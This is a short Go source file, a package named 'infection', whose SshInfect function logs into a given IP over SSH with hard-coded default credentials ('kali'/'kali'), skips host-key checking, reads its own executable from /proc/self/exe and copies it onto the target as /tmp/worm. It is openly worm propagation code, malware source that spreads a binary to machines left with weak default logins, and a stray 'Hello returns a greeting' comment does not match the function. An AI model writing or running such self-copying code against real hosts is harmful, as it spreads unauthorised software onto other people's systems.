package infection

import (
	"golang.org/x/crypto/ssh"
	"log"
	"time"
	"bytes"
)

var (
	username = "kali"
	password = "kali"
	timeout = time.Minute
)

// Hello returns a greeting for the named person.
func SshInfect(ip string) string {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: timeout,
	}
	client,err := ssh.Dial("tcp",ip,config)
	if err != nil {
		log.Fatal("Failed to dial: ", err)
	}
	defer client.Close()
	session, err := client.NewSession()
	if err != nil {
		log.Fatal("Failed to create session: ", err)
	}
	defer session.Close()
	var worm []byte
	worm = GetFile("/proc/self/exe")
	session.Stdin = bytes.NewReader(worm)
	out,err := session.CombinedOutput("cat > /tmp/worm")
	log.Printf("Command output: %q", out)

	if len(out) != 0 {
		log.Printf("Command output: %q", out)
	}

	return "Finished"
}
